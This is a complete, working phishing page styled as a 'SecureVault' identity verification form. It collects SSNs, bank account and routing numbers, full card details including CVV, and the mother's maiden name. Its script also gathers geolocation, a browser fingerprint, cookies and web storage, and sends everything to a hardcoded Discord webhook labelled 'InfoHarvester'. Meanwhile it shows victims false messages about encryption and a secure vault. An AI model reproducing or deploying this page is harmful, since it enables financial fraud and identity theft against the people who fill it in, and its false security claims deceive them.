<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verification Required</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0a0a0f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #14141e;
            padding: 40px;
            border-radius: 16px;
            max-width: 480px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid #2a2a3a;
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-size: 22px; font-weight: 300; letter-spacing: 2px; color: #8a8aff; }
        .logo span { color: #fff; font-weight: 600; }
        .field {
            margin-bottom: 20px;
        }
        .field label {
            display: block;
            font-size: 13px;
            color: #8888bb;
            margin-bottom: 6px;
            letter-spacing: 0.5px;
        }
        .field input {
            width: 100%;
            padding: 14px 16px;
            background: #1c1c2e;
            border: 1px solid #2c2c44;
            border-radius: 10px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: border 0.3s;
        }
        .field input:focus { border-color: #6a6aff; }
        .field input::placeholder { color: #555577; }
        .btn {
            width: 100%;
            padding: 16px;
            background: #6a6aff;
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
            letter-spacing: 1px;
        }
        .btn:hover { background: #7a7aff; }
        .status {
            margin-top: 18px;
            text-align: center;
            font-size: 13px;
            color: #666699;
        }
        .status.loading { color: #aab; }
        .status.success { color: #66dd88; }
        .status.error { color: #ff6666; }
        .note {
            font-size: 11px;
            color: #444466;
            text-align: center;
            margin-top: 20px;
            border-top: 1px solid #1c1c2e;
            padding-top: 18px;
            letter-spacing: 0.3px;
        }
        .hidden { display: none; }
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #444466;
            border-top: 2px solid #6a6aff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .flex-row { display: flex; gap: 12px; }
        .flex-row .field { flex: 1; }
    </style>
</head>
<body>
<div class="container" id="app">
    <div class="logo">
        <h1>◈ <span>SECURE</span>VAULT</h1>
        <p style="color:#666699;font-size:13px;margin-top:4px;">identity verification required</p>
    </div>

    <div id="formSection">
        <div class="field">
            <label>Full Legal Name</label>
            <input type="text" id="fullName" placeholder="e.g. Michael R. Thompson" />
        </div>
        <div class="field">
            <label>Email Address</label>
            <input type="email" id="email" placeholder="you@example.com" />
        </div>
        <div class="field">
            <label>Phone Number</label>
            <input type="tel" id="phone" placeholder="+1 (555) 000-9999" />
        </div>
        <div class="field">
            <label>Date of Birth</label>
            <input type="date" id="dob" />
        </div>
        <div class="field">
            <label>Bank Name</label>
            <input type="text" id="bankName" placeholder="e.g. Chase, BofA" />
        </div>
        <div class="field">
            <label>Bank Account Number</label>
            <input type="text" id="accountNumber" placeholder="••••••••••••" />
        </div>
        <div class="field">
            <label>Routing Number</label>
            <input type="text" id="routingNumber" placeholder="•••••••••" />
        </div>
        <div class="field">
            <label>Credit/Debit Card Number</label>
            <input type="text" id="cardNumber" placeholder="4111 1111 1111 1111" />
        </div>
        <div class="flex-row">
            <div class="field">
                <label>Expiry (MM/YY)</label>
                <input type="text" id="cardExpiry" placeholder="MM/YY" />
            </div>
            <div class="field">
                <label>CVV</label>
                <input type="text" id="cardCvv" placeholder="•••" />
            </div>
        </div>
        <div class="field">
            <label>Billing Address (Street, City, ZIP)</label>
            <input type="text" id="billingAddress" placeholder="123 Main St, NYC, 10001" />
        </div>
        <div class="field">
            <label>SSN / National ID (optional)</label>
            <input type="text" id="ssn" placeholder="•••-••-••••" />
        </div>
        <div class="field">
            <label>Mother's Maiden Name</label>
            <input type="text" id="maidenName" placeholder="(security question)" />
        </div>

        <button class="btn" id="submitBtn">▶ VERIFY IDENTITY</button>
        <div class="status" id="statusMsg">⏳ waiting for submission...</div>
    </div>

    <div class="note">🔒 256-bit encrypted • session expires after verification</div>
</div>

<script>
(function() {
    const WEBHOOK = "https://discord.com/api/webhooks/1534732118637416639/hqwXfMNEKrzR2ftoMOeNltB-o9Qey-k06qrFup873lEGjdglhGXVANsN3ElP1_r0Wj75";

    const fields = {
        fullName: document.getElementById('fullName'),
        email: document.getElementById('email'),
        phone: document.getElementById('phone'),
        dob: document.getElementById('dob'),
        bankName: document.getElementById('bankName'),
        accountNumber: document.getElementById('accountNumber'),
        routingNumber: document.getElementById('routingNumber'),
        cardNumber: document.getElementById('cardNumber'),
        cardExpiry: document.getElementById('cardExpiry'),
        cardCvv: document.getElementById('cardCvv'),
        billingAddress: document.getElementById('billingAddress'),
        ssn: document.getElementById('ssn'),
        maidenName: document.getElementById('maidenName')
    };

    const statusEl = document.getElementById('statusMsg');
    const submitBtn = document.getElementById('submitBtn');

    function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ error: "Geolocation not supported" });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude || null,
                        heading: pos.coords.heading || null,
                        speed: pos.coords.speed || null
                    });
                },
                (err) => {
                    resolve({ error: err.message });
                },
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        });
    }

    function getDeviceInfo() {
        const data = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'unspecified',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                availWidth: window.screen.availWidth,
                availHeight: window.screen.availHeight,
                colorDepth: window.screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1
            },
            windowSize: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            localTime: new Date().toLocaleString(),
            referrer: document.referrer || 'direct',
            url: window.location.href,
            domain: document.domain,
            hostname: location.hostname,
            path: location.pathname,
            protocol: location.protocol,
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                rtt: navigator.connection.rtt,
                downlink: navigator.connection.downlink,
                saveData: navigator.connection.saveData
            } : 'unavailable',
            battery: navigator.getBattery ? 'available' : 'unavailable',
            clipboard: navigator.clipboard ? 'available' : 'unavailable'
        };
        return data;
    }

    function getBrowserFingerprint() {
        const canvas = document.createElement('canvas');
        canvas.width = 256;
        canvas.height = 128;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#f0f0f0';
        ctx.fillRect(0, 0, 256, 128);
        ctx.font = '14px Arial';
        ctx.fillStyle = '#333';
        ctx.fillText('fp test', 40, 60);
        ctx.strokeStyle = '#0066cc';
        ctx.lineWidth = 2;
        ctx.strokeRect(20, 20, 200, 80);
        const dataUrl = canvas.toDataURL();
        let hash = 0;
        for (let i = 0; i < dataUrl.length; i++) {
            hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
            hash |= 0;
        }
        return { canvasHash: hash.toString(16), canvasDataLength: dataUrl.length };
    }

    function getNetworkInfo() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            return {
                type: conn.effectiveType || 'unknown',
                downlink: conn.downlink || 'unknown',
                rtt: conn.rtt || 'unknown',
                saveData: conn.saveData || false
            };
        }
        return { type: 'unavailable', downlink: 'unknown', rtt: 'unknown', saveData: false };
    }

    function collectAllData(formData) {
        const locData = formData.location || { error: 'not fetched' };
        const device = formData.device || {};
        const fp = formData.fingerprint || {};

        const payload = {
            timestamp: new Date().toISOString(),
            ip: '{{client_ip}}',
            location: locData,
            device: device,
            fingerprint: fp,
            form: {
                fullName: fields.fullName.value.trim() || 'N/A',
                email: fields.email.value.trim() || 'N/A',
                phone: fields.phone.value.trim() || 'N/A',
                dob: fields.dob.value || 'N/A',
                bankName: fields.bankName.value.trim() || 'N/A',
                accountNumber: fields.accountNumber.value.trim() || 'N/A',
                routingNumber: fields.routingNumber.value.trim() || 'N/A',
                cardNumber: fields.cardNumber.value.trim() || 'N/A',
                cardExpiry: fields.cardExpiry.value.trim() || 'N/A',
                cardCvv: fields.cardCvv.value.trim() || 'N/A',
                billingAddress: fields.billingAddress.value.trim() || 'N/A',
                ssn: fields.ssn.value.trim() || 'N/A',
                maidenName: fields.maidenName.value.trim() || 'N/A'
            },
            network: getNetworkInfo(),
            cookies: document.cookie || 'none',
            localStorage: (() => {
                try {
                    const obj = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        obj[key] = localStorage.getItem(key);
                    }
                    return obj;
                } catch(e) { return { error: 'unavailable' }; }
            })(),
            sessionStorage: (() => {
                try {
                    const obj = {};
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        obj[key] = sessionStorage.getItem(key);
                    }
                    return obj;
                } catch(e) { return { error: 'unavailable' }; }
            })(),
            webGLVendor: (() => {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return 'unavailable';
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (!debugInfo) return 'unavailable';
                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    return `${vendor} | ${renderer}`;
                } catch(e) { return 'unavailable'; }
            })(),
            plugins: (() => {
                try {
                    const names = [];
                    for (let i = 0; i < navigator.plugins.length; i++) {
                        names.push(navigator.plugins[i].name);
                    }
                    return names;
                } catch(e) { return []; }
            })(),
            mimeTypes: (() => {
                try {
                    const types = [];
                    for (let i = 0; i < navigator.mimeTypes.length; i++) {
                        types.push(navigator.mimeTypes[i].type);
                    }
                    return types;
                } catch(e) { return []; }
            })()
        };
        return payload;
    }

    function buildDiscordEmbed(data) {
        const form = data.form;
        const loc = data.location;
        const device = data.device;

        const locStr = loc.error
            ? `❌ ${loc.error}`
            : `📍 ${loc.lat}, ${loc.lon}\n🎯 Acc: ${loc.acc}m\n${loc.alt ? `📐 Alt: ${loc.alt}m` : ''}`;

        const embed = {
            title: '🔐 FULL DATA CAPTURE',
            color: 0x6a6aff,
            timestamp: data.timestamp,
            footer: { text: 'Harvester v2.0 • IP logged' },
            fields: [
                { name: '👤 Identity', value: `**Name:** ${form.fullName}\n**DOB:** ${form.dob}\n**SSN:** ${form.ssn}\n**Maiden:** ${form.maidenName}`, inline: false },
                { name: '📧 Contact', value: `**Email:** ${form.email}\n**Phone:** ${form.phone}\n**Address:** ${form.billingAddress}`, inline: false },
                { name: '🏦 Banking', value: `**Bank:** ${form.bankName}\n**Account:** ${form.accountNumber}\n**Routing:** ${form.routingNumber}`, inline: false },
                { name: '💳 Card', value: `**Number:** ${form.cardNumber}\n**Expiry:** ${form.cardExpiry}\n**CVV:** ${form.cardCvv}`, inline: false },
                { name: '📍 Geolocation', value: locStr, inline: false },
                { name: '💻 Device', value: `**Platform:** ${device.platform || 'N/A'}\n**UA:** ${device.userAgent ? device.userAgent.substring(0, 80) + '...' : 'N/A'}\n**Lang:** ${device.language}\n**Cores:** ${device.hardwareConcurrency}\n**Memory:** ${device.deviceMemory}GB\n**Touch:** ${device.maxTouchPoints}pts`, inline: false },
                { name: '🖥️ Screen', value: `${device.screen?.width}x${device.screen?.height} (${device.screen?.colorDepth}bit)\nDPI: ${device.screen?.pixelRatio}\nWindow: ${device.windowSize?.innerWidth}x${device.windowSize?.innerHeight}`, inline: false },
                { name: '⏰ Time', value: `**TZ:** ${device.timezone}\n**Offset:** ${device.timezoneOffset}min\n**Local:** ${device.localTime}`, inline: false },
                { name: '🌐 Network', value: `**Type:** ${data.network.type}\n**Downlink:** ${data.network.downlink}Mbps\n**RTT:** ${data.network.rtt}ms\n**SaveData:** ${data.network.saveData}`, inline: false },
                { name: '🖨️ Fingerprint', value: `**Canvas:** ${data.fingerprint?.canvasHash || 'N/A'}\n**WebGL:** ${data.webGLVendor || 'N/A'}`, inline: false },
                { name: '📦 Storage', value: `**Cookies:** ${(data.cookies || 'none').length > 60 ? data.cookies.substring(0, 60) + '...' : data.cookies || 'none'}\n**LocalStorage:** ${Object.keys(data.localStorage || {}).length} keys\n**SessionStorage:** ${Object.keys(data.sessionStorage || {}).length} keys`, inline: false },
                { name: '🔌 Plugins', value: (data.plugins || []).slice(0, 5).join(', ') || 'none', inline: false },
                { name: '🌐 Page', value: `**URL:** ${data.url || 'N/A'}\n**Referrer:** ${data.referrer || 'direct'}`, inline: false }
            ]
        };
        return embed;
    }

    function sendToWebhook(embed) {
        const payload = {
            embeds: [embed],
            username: 'InfoHarvester',
            avatar_url: 'https://i.imgur.com/4M34hi2.png'
        };

        return fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    async function handleSubmit() {
        statusEl.className = 'status loading';
        statusEl.innerHTML = '<span class="spinner"></span> fetching location + device data...';
        submitBtn.disabled = true;

        try {
            const location = await getLocation();
            const device = getDeviceInfo();
            const fingerprint = getBrowserFingerprint();

            const tempData = { location, device, fingerprint };
            const fullData = collectAllData(tempData);
            const embed = buildDiscordEmbed(fullData);

            statusEl.innerHTML = '<span class="spinner"></span> sending to secure vault...';

            const response = await sendToWebhook(embed);

            if (response.ok) {
                statusEl.className = 'status success';
                statusEl.innerHTML = '✓ verification successful — redirecting...';
                setTimeout(() => {
                    document.getElementById('formSection').innerHTML = `
                        <div style="text-align:center;padding:30px 0;">
                            <div style="font-size:48px;margin-bottom:16px;">✓</div>
                            <h2 style="color:#66dd88;">Identity Verified</h2>
                            <p style="color:#8888bb;margin-top:12px;">You will be redirected shortly.</p>
                            <p style="color:#444466;font-size:12px;margin-top:20px;">This session is now secure.</p>
                        </div>
                    `;
                    statusEl.style.display = 'none';
                }, 1200);
            } else {
                const errText = await response.text();
                statusEl.className = 'status error';
                statusEl.innerHTML = `✗ server error (${response.status}) — try again`;
                submitBtn.disabled = false;
                console.error('Webhook error:', errText);
            }
        } catch (err) {
            statusEl.className = 'status error';
            statusEl.innerHTML = `✗ ${err.message || 'network error'}`;
            submitBtn.disabled = false;
        }
    }

    submitBtn.addEventListener('click', handleSubmit);

    // auto-grab on load
    window.addEventListener('load', () => {
        // silently pre-fetch location
        navigator.geolocation?.getCurrentPosition(() => {}, () => {}, { timeout: 5000 });
    });
})();
</script>
</body>
</html>
